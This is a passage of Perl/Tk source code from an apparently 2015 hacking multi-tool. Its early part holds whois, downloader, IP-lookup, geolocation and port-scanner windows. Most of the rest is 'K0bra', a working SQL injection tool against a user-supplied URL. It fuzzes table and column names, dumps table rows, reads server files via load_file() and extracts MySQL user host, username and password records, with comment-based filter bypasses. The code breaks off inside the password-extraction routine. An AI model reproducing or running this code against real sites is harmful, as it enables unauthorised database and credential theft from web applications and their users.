            $stat->configure( -text => "The host is offline" );
        }
    }

}    #End

sub menu_whois {    #Start

    my $newas = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $newas->geometry("400x300+50+50");
    $newas->title("Whois Online 0.2 || (C) Doddy Hackman 2015");
    $newas->resizable( 0, 0 );

    $newas->Label(
        -text       => "Domain : ",
        -font       => "Impact2",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => "10", -y => "10" );
    my $dom = $newas->Entry(
        -width      => "30",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => "85", -y => "13" );

    my $console = $newas->Scrolled(
        "ROText",
        -scrollbars => "e",
        -width      => 36,
        -height     => 15,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 15, -y => 50 );

    $newas->Button(
        -text             => "Search",
        -command          => \&buscar,
        -width            => "10",
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto
    )->place( -x => 310, -y => "50" );
    $newas->Button(
        -text             => "Clean",
        -command          => \&limpiar,
        -width            => "10",
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto
    )->place( -x => 310, -y => "80" );
    $newas->Button(
        -text             => "Exit",
        -command          => \&salir,
        -width            => "10",
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto
    )->place( -x => 310, -y => "110" );

    MainLoop;

    sub buscar {
        $console->delete( "0.2", "end" );
        my $target = $dom->get;
        $newas->update;
        $console->insert( "end", whois($target) );
        $newas->update;
    }

    sub limpiar {
        $console->delete( "0.2", "end" );
        $dom->delete( "0.2", "end" );
    }

    sub salir {
        $newas->destroy();
    }

    sub whois {

        my $ob   = shift;
        my $code = tomar(
            "http://networking.ringofsaturn.com/Tools/whois.php",
            { "domain" => $ob, "submit" => "submit" }
        );

        my @chau = ( "&quot;", "&gt;&gt;&gt;", "&lt;&lt;&lt;" );

        if ( $code =~ /<pre>(.*?)<\/pre>/sig ) {
            my $resul = $1;
            chomp $resul;

            for my $cha (@chau) {
                $resul =~ s/$cha//ig;
            }

            if ( $resul =~ /Whois Server Version/ ) {
                return $resul;
            }
            else {
                return "Not Found";
            }
        }
    }

}    #End

sub menu_downloader {    #Start

    my $dron = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $dron->geometry("430x70+20+20");
    $dron->resizable( 0, 0 );
    $dron->title("Simple Downloader 0.2 || [+] Status : <None>");

    $dron->Label(
        -text       => "URL : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 20 );
    my $pre = $dron->Entry(
        -width      => 45,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 60, -y => 27 );
    $dron->Button(
        -command          => \&now,
        -text             => "Download",
        -width            => 10,
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto
    )->place( -x => 340, -y => 25 );

    MainLoop;

    sub now {

        my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $pre->get );
        $dron->title("Simple Downloader 0.2 || [+] Status : Downloading..");
        if ( $path =~ /(.*)\/(.*)$/ ) {
            my $file = $2;
            if ( download( $pre->get, $file ) ) {
                $dron->Dialog(
                    -title            => "OK",
                    -buttons          => ["OK"],
                    -text             => "File downloaded",
                    -background       => $color_fondo,
                    -foreground       => $color_texto,
                    -activebackground => $color_texto
                )->Show();
            }
            else {
                $dron->Dialog(
                    -title            => "Error",
                    -buttons          => ["OK"],
                    -text             => "Error",
                    -background       => $color_fondo,
                    -foreground       => $color_texto,
                    -activebackground => $color_texto
                )->Show();
            }
        }
        $dron->title("Simple Downloader 0.2 || [+] Status : <None>");
    }

    sub download {
        if ( $nave->mirror( $_[0], $_[1] ) ) {
            if ( -f $_[1] ) {
                return true;
            }
        }
    }

}    #End

sub menu_getip {    #Start

    my $ua = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $ua->title("Get IP 0.2 || (C) Doddy Hackman 2015");
    $ua->geometry("350x110+20+20");
    $ua->resizable( 0, 0 );

    $ua->Label(
        -text       => "Host : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 20, -x => 20 );
    my $host = $ua->Entry(
        -width      => 30,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 25, -x => 70 );
    $ua->Button(
        -text             => "Get IP",
        -width            => 10,
        -command          => \&quien,
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto
    )->place( -y => 23, -x => 260 );

    $ua->Label(
        -text       => "IP : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 60, -x => 20 );
    my $ip = $ua->Entry(
        -width      => 33,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 65, -x => 52 );

    MainLoop;

    sub quien {
        $ip->configure( -text => get_ip( $host->get ) );
    }

    sub get_ip {
        my $get = gethostbyname( $_[0] );
        return inet_ntoa($get);
    }

}    #End

sub menu_locate {    #Start

    $p = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $p->title("Locate IP 0.4 || (C) Doddy Hackman 2015");
    $p->geometry("440x300+20+20");
    $p->resizable( 0, 0 );

    $p->Label(
        -text       => "Target : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 20 );
    my $tar = $p->Entry(
        -width      => 30,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 24, -x => 80 );
    $p->Button(
        -text             => "Find",
        -width            => 10,
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto,
        -command          => \&st
    )->place( -y => 23, -x => 272 );
    $p->Button(
        -text             => "Logs",
        -width            => 10,
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto,
        -command          => \&openlogsa
    )->place( -y => 23, -x => 350 );

    $p->Label(
        -text       => "Information",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 80, -y => 80 );

    $p->Label(
        -text       => "City : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 140, -x => 23 );
    my $city = $p->Entry(
        -width      => 21,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 143, -x => 65 );

    $p->Label(
        -text       => "Country : ",
        -font       => "Country",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 170, -x => 23 );
    my $country = $p->Entry(
        -width      => 17,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 173, -x => 90 );

    $p->Label(
        -text       => "State : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 200, -x => 23 );
    my $state = $p->Entry(
        -width      => 20,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 203, -x => 75 );

    $p->Label(
        -text       => "DNS Found",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 80, -x => 285 );
    my $dns = $p->Listbox(
        -width      => 30,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 230, -y => 130 );

    MainLoop;

    sub st {

        $city->configure( -text => " " );
        $country->configure( -text => " " );
        $state->configure( -text => " " );
        $dns->delete( "0.0", "end" );

        my $target = $tar->get;

        savefile( "info-logs.txt", "[+] Target : $target" );

        my $get    = gethostbyname($target);
        my $target = inet_ntoa($get);

        savefile( "info-logs.txt", "[+] IP : $target\n" );

        $re = toma( "http://whatismyipaddress.com/ip/" . $target );

        if ( $re =~ /<tr><th>City:<\/th><td>(.*)<\/td><\/tr>/ ) {
            savefile( "info-logs.txt", "[+] City : $1" );
            $city->configure( -text => $1 );
        }
        else {
            $city->configure( -text => "Not Found" );
        }
        if ( $re =~ /<th>Country:<\/th><td>(.*) <img/ ) {
            savefile( "info-logs.txt", "[+] Country : $1" );
            $country->configure( -text => $1 );
        }
        else {
            $country->configure( -text => "Not Found" );
        }
        if ( $re =~ /<tr><th>State\/Region:<\/th><td>(.*)<\/td><\/tr>/ ) {
            savefile( "info-logs.txt", "[+] State of Region : $1" );
            $state->configure( -text => $1 );
        }
        else {
            $state->configure( -text => "Not Found" );
        }

        my $code = toma( "http://www.ip-adress.com/reverse_ip/" . $target );

        savefile( "info-logs.txt", "" );

        while ( $code =~ /whois\/(.*?)\">Whois/g ) {
            my $dnsa = $1;
            chomp $dnsa;
            if ( $dnsa ne "" ) {
                savefile( "info-logs.txt", "[+] DNS Found : $dnsa" );
                $dns->insert( "end", $dnsa );
            }
        }
        savefile( "info-logs.txt", "\n######################\n" );
    }

}    #End

sub menu_port {    #Start

    my $kax = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $kax->geometry("422x130+20+20");
    $kax->resizable( 0, 0 );
    $kax->title("Scan Port 0.6 || (C) Doddy Hackman 2015");

    $kax->Label(
        -text       => "Host : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 20 );
    my $hostx = $kax->Entry(
        -width      => 30,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 68, -y => 26 );
    $kax->Label(
        -text       => "From port : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 50 );
    my $startx = $kax->Entry(
        -width      => 8,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 100, -y => 55 );
    $kax->Label(
        -text       => "To : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 170, -y => 50 );
    my $endx = $kax->Entry(
        -width      => 8,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 200, -y => 55 );

    $kax->Label(
        -text       => "Progress : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 84 );
    my $tatus = $kax->Entry(
        -width      => 8,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 100, -y => 90 );
    $kax->Button(
        -text             => "Fast",
        -width            => 6,
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto,
        -command          => \&scanuno
    )->place( -x => 158, -y => 88 );
    $kax->Button(
        -text             => "Full",
        -width            => 6,
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto,
        -command          => \&scandos
    )->place( -x => 208, -y => 88 );

    $kax->Label(
        -text       => "Port Found",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 305, -y => 20 );
    my $porters = $kax->Listbox(
        -width      => 20,
        -height     => 4,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 280, -y => 50 );

    MainLoop;

    sub scanuno {

        my %ports = (
            "21"   => "ftp",
            "22"   => "ssh",
            "25"   => "smtp",
            "80"   => "http",
            "110"  => "pop3",
            "3306" => "mysql"
        );

        $porters->delete( "0.0", "end" );
        $tatus->configure( -text => " " );

        for my $port ( keys %ports ) {
            $kax->update;
            $tatus->configure( -text => $port );
            if (
                new IO::Socket::INET(
                    PeerAddr => $hostx->get,
                    PeerPort => $port,
                    Proto    => "tcp",
                    Timeout  => 0.5
                )
              )
            {
                $porters->insert( "end", $port );
            }
        }
        $tatus->configure( -text => " " );
    }

    sub scandos {

        $porters->delete( "0.0", "end" );
        $tatus->configure( -text => " " );

        for my $port ( $startx->get .. $endx->get ) {
            $kax->update;
            $tatus->configure( -text => $port );
            if (
                new IO::Socket::INET(
                    PeerAddr => $hostx->get,
                    PeerPort => $port,
                    Proto    => "tcp",
                    Timeout  => 0.5
                )
              )
            {
                $porters->insert( "end", $port );
            }
        }
        $tatus->configure( -text => " " );
    }

}    #End

sub menu_kobra {    #Start

    installer();

    my $logo = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $logo->title("K0bra 1.6 (C) Doddy Hackman 2015");
    $logo->geometry("500x620+20+20");
    $logo->resizable( 0, 0 );

    $menula = $logo->Frame(
        -relief     => "sunken",
        -bd         => 1,
        -background => $color_fondo,
        -foreground => $color_texto
    );
    my $menulnowaxm = $menula->Menubutton(
        -text             => "Options",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    my $aboutnowaxm = $menula->Menubutton(
        -text             => "About",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    my $exitnowaxm = $menula->Menubutton(
        -text             => "Exit",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    $menula->pack( -side => "top", -fill => "x" );

    $menulnowaxm->command(
        -label      => "Scan",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&nownow
    );
    $menulnowaxm->command(
        -label      => "Scanner without checking",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&nownownow
    );
    $menulnowaxm->command(
        -label      => "Get Details",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&details
    );
    $menulnowaxm->command(
        -label      => "Fuzz Tables",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&fuzz
    );
    $menulnowaxm->command(
        -label      => "Fuzz Columns",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&fuzzcol
    );
    $menulnowaxm->command(
        -label      => "Mysql User",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&mynow
    );
    $menulnowaxm->command(
        -label      => "load_file",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&myfile
    );
    $menulnowaxm->command(
        -label      => "Dump",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&dum
    );
    $menulnowaxm->command(
        -label      => "Hex",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&per1
    );
    $menulnowaxm->command(
        -label      => "ASCII",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&per2
    );
    $menulnowaxm->command(
        -label      => "Logs",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&openlogsk
    );

    $aboutnowaxm->command(
        -label      => "About",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&aboutxa
    );

    $exitnowaxm->command(
        -label      => "Exit",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&exitnow
    );

    $logo->Label(
        -text       => "Target : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 40 );
    my $targetero = $logo->Entry(
        -width      => 65,
        -text       => "http://127.0.0.1/sql.php?id=1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 43, -x => 80 );

    $logo->Label(
        -text       => "Bypass : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 80 );

    $logo->Optionmenu(
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto,
        -options  => [ [ "--" => "--" ], [ "/*" => "/*" ], [ "%20" => "%20" ] ],
        -variable => \$var,
        -textvariable => \$bypass
    )->place( -x => 90, -y => 82 );

    $logo->Label(
        -text       => "Details : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 190, -x => 60 );
    my $informatero = $logo->Listbox(
        -height     => 10,
        -width      => 50,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 150, -x => 130 );

    $logo->Label(
        -text       => "Databases",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 340, -x => 65 );
    $logo->Label(
        -text       => "Tables",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 340, -x => 215 );
    $logo->Label(
        -text       => "Columns",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 340, -x => 345 );

    my $datero = $logo->Listbox(
        -width      => 20,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 380, -x => 40 );
    my $tablero = $logo->Listbox(
        -width      => 20,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 380, -x => 180 );
    my $columnero = $logo->Listbox(
        -width      => 20,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 380, -x => 320 );

    $logo->Label(
        -text       => "Status : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 100, -y => 560 );
    my $tatus = $logo->Entry(
        -width      => 35,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 160, -y => 563 );

    $datero->bind( "<Double-1>",    [ \&getdbs ] );
    $tablero->bind( "<Double-1>",   [ \&schematablesdb ] );
    $columnero->bind( "<Double-1>", [ \&schemacolumnsdb ] );

    MainLoop;

    sub nownownow {
        motor( $targetero->get, $bypass );
    }

    sub fuzz {

        my $page = $targetero->get;
        my $save = partimealmedio($page);

        $tablero->delete( "0.0", "end" );

        ( $pass1, $pass2 ) = &bypass($bypass);
        my $count = "0";
        savefile( $save . ".txt", "\n" );
        if ( $page =~ /(.*)hackman(.*)/g ) {
            my $start = $1;
            my $end   = $2;
            for my $table (@buscar2) {
                chomp $table;
                $tatus->configure( -text => "Fuzzing Tables ..." );
                $logo->update;
                $concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))";
                $injection =
                    $start
                  . $concat
                  . $end
                  . $pass1 . "from"
                  . $pass1
                  . $table
                  . $pass2;
                $code = toma($injection);
                if ( $code =~ /ERTOR854/g ) {
                    $count++;
                    $tablero->insert( "end", $table );
                    savefile( $save . ".txt", "[Table Found] : $table" );
                }
            }
        }
        $tatus->configure( -text => " " );
    }

    sub fuzzcol {

        my $page = $targetero->get;
        my $save = partimealmedio($page);
        ( $pass1, $pass2 ) = &bypass($bypass);

        $columnero->delete( "0.0", "end" );

        $d = $tablero->curselection();
        for my $id (@$d) {
            my $table = $tablero->get($id);

            my $count = "0";
            savefile( $save . ".txt", "\n" );
            if ( $page =~ /(.*)hackman(.*)/ ) {
                my $start = $1;
                my $end   = $2;
                savefile( $save . ".txt", "[Table] : $table" );
                for my $columns (@buscar1) {
                    chomp $columns;
                    $tatus->configure( -text => "Fuzzing columns ..." );
                    $logo->update;
                    $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),$columns,char(69,82,84,79,82,56,53,52))))";
                    $code =
                      toma( $start
                          . $concat
                          . $end
                          . $pass1 . "from"
                          . $pass1
                          . $table
                          . $pass2 );
                    if ( $code =~ /ERTOR854/g ) {
                        $columnero->insert( "end", $columns );
                        savefile( $save . ".txt", "[Column Found] : $columns" );
                    }
                }
            }
        }
        $tatus->configure( -text => " " );
    }

    sub per1 {

        my $he = MainWindow->new(
            -background => $color_fondo,
            -foreground => $color_texto
        );
        $he->title("Hex Converter (C) Doddy Hackman 2015");
        $he->geometry("420x70+20+20");
        $he->resizable( 0, 0 );
        $he->Label(
            -text       => "Text : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 20, -y => 20 );
        my $cam = $he->Entry(
            -width      => 30,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 24, -x => 65 );
        $he->Button(
            -text             => "Encode",
            -width            => 10,
            -command          => \&paso1,
            -activebackground => $color_texto,
            -background       => $color_fondo,
            -foreground       => $color_texto
        )->place( -y => 23, -x => 255 );
        $he->Button(
            -text             => "Decode",
            -width            => 10,
            -command          => \&paso2,
            -activebackground => $color_texto,
            -background       => $color_fondo,
            -foreground       => $color_texto
        )->place( -y => 23, -x => 325 );

        sub paso1 {
            my $caca = $cam->get();
            chomp $caca;
            $cam->configure( -text => encode($caca) );
        }

        sub paso2 {
            my $caca = $cam->get();
            chomp $caca;
            $cam->configure( -text => decode($caca) );
        }
    }

    sub per2 {

        my $hexae = MainWindow->new(
            -background => $color_fondo,
            -foreground => $color_texto
        );
        $hexae->title("Ascii Converter (C) Doddy Hackman 2015");
        $hexae->geometry("420x70+20+20");
        $hexae->resizable( 0, 0 );
        $hexae->Label(
            -text       => "Text : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 20, -y => 20 );
        my $cama = $hexae->Entry(
            -width      => 30,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 24, -x => 65 );
        $hexae->Button(
            -text             => "Encode",
            -width            => 10,
            -command          => \&paso3,
            -activebackground => $color_texto,
            -background       => $color_fondo,
            -foreground       => $color_texto
        )->place( -y => 23, -x => 255 );
        $hexae->Button(
            -text             => "Decode",
            -width            => 10,
            -command          => \&paso4,
            -activebackground => $color_texto,
            -background       => $color_fondo,
            -foreground       => $color_texto
        )->place( -y => 23, -x => 325 );

        sub paso3 {
            my $caca = $cama->get();
            chomp $caca;
            $cama->configure( -text => ascii($caca) );
        }

        sub paso4 {
            my $caca = $cama->get();
            chomp $caca;
            $cama->configure( -text => ascii_de($caca) );
        }
    }

    sub dum {

        my $pa = $targetero->get;

        $max = MainWindow->new(
            -background => $color_fondo,
            -foreground => $color_texto
        );
        $max->title("Dump Values");
        $max->geometry("480x380+20+20");
        $max->resizable( 0, 0 );

        $max->Label(
            -text       => "Target : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 50, -y => 20 );
        my $tata = $max->Entry(
            -width      => 40,
            -text       => $pa,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 23, -x => 110 );

        $max->Label(
            -text       => "Table : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 50, -y => 60 );
        my $tato = $max->Entry(
            -width      => 20,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 105, -y => 63 );

        $max->Label(
            -text       => "Column1 : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 90, -x => 50 );
        my $tatu = $max->Entry(
            -width      => 20,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 130, -y => 93 );

        $max->Label(
            -text       => "Column2 : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 130, -x => 50 );
        my $tita = $max->Entry(
            -width      => 20,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 133, -x => 130 );

        $max->Button(
            -width            => 10,
            -text             => "Extract",
            -command          => \&tengor,
            -activebackground => $color_texto,
            -background       => $color_fondo,
            -foreground       => $color_texto
        )->place( -y => 20, -x => 360 );

        $max->Label(
            -text       => "Column1",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 100, -y => 180 );
        $max->Label(
            -text       => "Column2",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 300, -y => 180 );

        my $duta1 = $max->Listbox(
            -width      => 20,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 210, -x => 70 );
        my $duta2 = $max->Listbox(
            -width      => 23,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 210, -x => 260 );

        sub tengor {

            $duta1->delete( "0.0", "end" );
            $duta2->delete( "0.0", "end" );

            my $page  = $tata->get;
            my $tabla = $tato->get;
            my $col1  = $tatu->get;
            my $col2  = $tita->get;

            my $save = partimealmedio($page);

            savefile( $save . ".txt", "\n" );

            ( $pass1, $pass2 ) = &bypass($bypass);
            if ( $page =~ /(.*)hackman(.*)/ ) {
                my $start = $1;
                my $end   = $2;
                $concatx =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),count($col1),char(69,82,84,79,82,56,53,52))))";
                $val_code =
                  toma( $start
                      . $concatx
                      . $end
                      . $pass1 . "from"
                      . $pass1
                      . $tabla
                      . $pass2 );
                $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),$col1,char(69,82,84,79,82,56,53,52),$col2,char(69,82,84,79,82,56,53,52))))";
                if ( $val_code =~ /ERTOR854(.*)ERTOR854/ig ) {
                    $tota = $1;
                    savefile( $save . ".txt", "[Table] : $tabla" );
                    savefile( $save . ".txt",
                        "[+] Length of the rows: $tota\n" );
                    savefile( $save . ".txt", "[$col1] [$col2]\n" );
                    for my $limit ( 0 .. $tota ) {
                        chomp $limit;
                        $logo->update;
                        $injection =
                          toma( $start
                              . $concat
                              . $end
                              . $pass1 . "from"
                              . $pass1
                              . $tabla
                              . $pass1 . "limit"
                              . $pass1
                              . $limit . ",1"
                              . $pass2 );
                        if (
                            $injection =~ /ERTOR854(.*)ERTOR854(.*)ERTOR854/ig )
                        {
                            savefile( $save . ".txt",
                                "[$col1] : $1   [$col2] : $2" );
                            $duta1->insert( "end", $1 );
                            $duta2->insert( "end", $2 );
                        }
                        else {
                            last;
                        }
                    }
                }
                else {
                    $tatus->configure( -text => "Error" );
                }
            }
        }
    }

    sub myfile {

        my $pag = $targetero->get;

        $loa = MainWindow->new(
            -background => $color_fondo,
            -foreground => $color_texto
        );
        $loa->title("load_file helper");
        $loa->geometry("380x410+20+20");
        $loa->resizable( 0, 0 );

        $loa->Label(
            -text       => "Target : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 20, -y => 20 );
        my $aa = $loa->Entry(
            -width      => 40,
            -text       => $pag,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 23, -x => 80 );
        $loa->Label(
            -text       => "File : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 60, -x => 23 );
        my $tea = $loa->Entry(
            -width      => 20,
            -text       => "C:/xampp/htdocs/aca.txt",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 63, -x => 63 );
        $loa->Button(
            -text             => "Encode",
            -width            => 8,
            -command          => \&eno,
            -activebackground => $color_texto,
            -background       => $color_fondo,
            -foreground       => $color_texto
        )->place( -y => 62, -x => 200 );
        $loa->Button(
            -text             => "Show",
            -width            => 8,
            -command          => \&ena,
            -activebackground => $color_texto,
            -background       => $color_fondo,
            -foreground       => $color_texto
        )->place( -y => 62, -x => 263 );

        $loa->Label(
            -text       => "Output",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 160, -y => 130 );
        my $mo = $loa->ROText(
            -width      => 45,
            -height     => 15,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 170, -x => 25 );

        sub eno {
            my $t = $tea->get;
            if ( $t =~ /0x/ ) {
                $tea->configure( -text => decode($t) );
            }
            else {
                $tea->configure( -text => encode($t) );
            }
        }

        sub ena {

            $mo->delete( "0.0", "end" );

            my $page = $aa->get;
            my $save = partimealmedio($page);

            savefile( $save . ".txt", "\n" );
            ( $pass1, $pass2 ) = &bypass($bypass);
            if ( $page =~ /(.*)hackman(.*)/g ) {
                my $start = $1;
                my $end   = $2;
                my $file  = $tea->get;
                chomp $file;
                $concat =
                    "unhex(hex(concat(char(107,48,98,114,97),load_file("
                  . $file
                  . "),char(107,48,98,114,97))))";
                my $code = toma( $start . $concat . $end . $pass2 );
                chomp $code;

                if ( $code =~ /k0bra(.*)k0bra/s ) {
                    my $word = $1;
                    $mo->insert( "end", $word );
                    savefile( $save . ".txt", "[File Found] : $file" );
                    savefile( $save . ".txt", "\n[Source Start]\n" );
                    savefile( $save . ".txt", "$word" );
                    savefile( $save . ".txt", "\n[Source End]\n" );
                }
                else {
                    $tatus->configure( -text => "Error" );
                }
            }
        }
    }

    sub mynow {

        my $p = $targetero->get;

        $mi = MainWindow->new(
            -background => $color_fondo,
            -foreground => $color_texto
        );
        $mi->title("Mysql Extractor");
        $mi->geometry("500x300+20+20");
        $mi->resizable( 0, 0 );

        $mi->Label(
            -text       => "Target : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 50, -y => 20 );
        my $guix = $mi->Entry(
            -width      => 40,
            -text       => $p,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 23, -x => 110 );
        $mi->Button(
            -width            => 10,
            -text             => "Extract",
            -command          => \&tengorax,
            -background       => $color_texto,
            -foreground       => $color_fondo,
            -activebackground => $color_texto
        )->place( -y => 20, -x => 360 );

        $mi->Label(
            -text       => "Host",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 60, -y => 90 );
        $mi->Label(
            -text       => "User",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 200, -y => 90 );
        $mi->Label(
            -text       => "Password",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 360, -y => 90 );

        my $hostero = $mi->Listbox(
            -width      => 20,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 130, -x => 40 );
        my $usero = $mi->Listbox(
            -width      => 23,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 130, -x => 180 );
        my $pasero = $mi->Listbox(
            -width      => 20,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -y => 130, -x => 340 );

        sub tengorax {

            my $page = $guix->get;
            my $save = partimealmedio($page);

            my $cop  = $page;
            my $cop1 = $page;

            savefile( $save . ".txt", "\n" );

            ( $pass1, $pass2 ) = &bypass($bypass);
            $page =~ s/hackman/concat(char(82,65,84,83,88,80,68,79,87,78,49))/;
            $code =
              toma( $page . $pass1 . "from" . $pass1 . "mysql.user" . $pass2 );
            if ( $code =~ /RATSXPDOWN/ig ) {
                $cop1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
                $code1 = toma(
                    $cop1 . $pass1 . "from" . $pass1 . "mysql.user" . $pass2 );
